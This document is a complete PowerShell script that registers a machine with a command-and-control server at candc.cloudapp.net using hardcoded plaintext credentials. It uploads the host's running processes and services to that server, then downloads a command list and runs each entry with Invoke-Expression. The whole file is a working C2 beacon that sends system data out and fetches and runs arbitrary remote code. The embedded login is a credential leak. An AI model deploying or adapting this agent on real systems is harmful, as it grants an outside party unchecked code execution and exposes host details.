#create a new webclient object
$wc = New-Object Net.WebClient
#set username and password
$wc.Credentials = new-object System.Net.NetworkCredential("boris", 'B0r1s2012', "candc")
#program data path where we store our run time data
$programdata = (Get-ChildItem env:ALLUSERSPROFILE).value	

#
# Register with C and C
#
"Registering with c&c"
# registration URL
$regurl = "https://candc.cloudapp.net/checkin"
#hostname of this client
$hostname = hostname
# temporary registration file
$regofile = Join-Path $programdata ($hostname + ".txt")
# make the registration file, it will be the results of get-process and get-service into a file
Get-Process | Out-File $regofile
Get-service | Out-File $regofile -Append
#upload to command and contorl
$wc.UploadFile($($regurl+"/"+$hostname+".txt"), "PUT", $regofile)

#
# Get commands to run
#

#CommandURL contains url to command and control, can be HTTP, HTTPS, FTP or UNC
$commandurl = "https://candc.cloudapp.net/commands/commands.txt"
#Use the webclient to download the commands as a string, and convert them from their CSV format
$commands = $wc.downloadstring($commandurl) | ConvertFrom-Csv -Header('id','expression','hostname')
#did we get any commands
if ($commands) {
	"Successfully captured commands from C&C"
	# filename where we store previously run task ids
	$runtasksname = "previoustasks.txt"
	# path to above said file
	$runtaskspath = Join-Path $programdata $runtasksname
	# get list of previously run commands
	$previouslyexecutedcommands = Get-Content $runtaskspath -ErrorAction SilentlyContinue 
	# Filter list of commands to remove those already processed
	$commands = $commands | Where-Object { !( $previouslyexecutedcommands -contains $_.id) }
	#remove any where the hostname is not ours, or not blank
	$commands = $commands | Where-Object { ($_.hostname -eq "") -or ($_.hostname -eq $hostname)}
	# if after all of this filtering, we have some tasks let, then we need to run them
	if ($commands) {
		"We have tasks to run"
		# execute each remaining task and mark if successfully run
		foreach ($command in $commands) {
			"Executing $($command.expression)"
			# clear error state
			$error.clear()
			# run the expression
			Invoke-Expression $command.expression
			# if no errors occured, mark as completed
			if (!$error){
				$command.id | Out-File $runtaskspath -Append
			}
		}
	} else {
		"No new commands found"
	}
} else {
	"No Commands found - possible error talking to C&C?"
}
